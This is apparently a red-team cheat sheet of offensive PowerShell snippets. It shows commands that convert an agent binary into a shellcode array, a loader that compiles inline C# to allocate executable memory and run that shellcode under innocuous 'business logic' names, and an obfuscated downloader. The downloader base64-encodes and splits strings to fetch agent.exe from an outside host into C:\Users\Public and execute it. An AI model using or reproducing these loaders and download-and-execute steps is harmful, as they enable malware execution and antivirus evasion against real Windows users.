Reformat shellcode
```powershell
xxd -p agent.bin | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > agent.payload
```

shellcode length
```powershell
cat agent.payload | tr ',' ' ' | wc -w
```

```powershell
# Author: thec0nci3rge
# The inline technique idea came from John Hammond's video: https://www.youtube.com/watch?v=EwEwRLedeKI
# The original C# snipped was found here: https://github.com/tbhaxor/CSharp-and-Infosec/blob/main/PInvoke%20MSF%20Payload/Program.cs

$MyBusinessLogic = @"
using System;
using System.Runtime.InteropServices;

public class MyBusinessLogic {
    static byte[] my_buf = new byte[<PUT_YOUR_SHELLCODE_LENGTH_HERE>] {
        <PUT_YOUR_SHELLCODE_HERE - e.g. "0x39,0xc0,0x73,0x1d,0x8b,...">
    };

    // declaring VirtualAlloc function from kernel32.dll
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);

    // create delegate signature for executor function
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void WindowRun();

    public static void Main() {
        // get pointer of allocated buffer
        IntPtr my_virt_alloc_pointer = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(my_buf.Length), 0x1000, 0x40);
        
        // write the buffer into memory
        Marshal.Copy(my_buf, 0x0, my_virt_alloc_pointer, my_buf.Length);
        
        // get function pointer of the allocated buffer
        WindowRun business_run_logic = Marshal.GetDelegateForFunctionPointer<WindowRun>(my_virt_alloc_pointer);
        
        // run "business-logic"
        business_run_logic();
    }
}
"@

# specifying Add-Type will force .NET to compile C# code
Add-Type $MyBusinessLogic

[MyBusinessLogic]::Main()
```

```powershell
# Base64-encoded and chunked strings
$a = "a" + "HR0cDovLzE5Mi4xNjguMi4yMjg6ODA4MC9hZ2VudC5leGU="   # http://192.168.2.228:8080/agent.exe
$b = "YWdlbnQuZXhl"                                            # agent.exe
$c = "QzpcVXNlcnNcUHVibGlj"                                    # C:\Users\Public

# Decode function
$d = {
    param($e)
    [System.Text.Encoding]::UTF8.GetString(
        [System.Convert]::FromBase64String($e)
    )
}

# Decoded values
$u = & $d $a   # URL
$n = & $d $b   # Executable name
$p = & $d $c   # Destination path

# Full path
$f = (Join-Path $p $n)

# Obfuscated command aliases
$w = "i" + "wr"   # Invoke-WebRequest
$x = "s" + "TarT" + "-pr" + "OCesS"         # Start-Process

# Download and execute
& (Get-Command $w) -Uri $u -OutFile $f
& (Get-Command $x) $f

```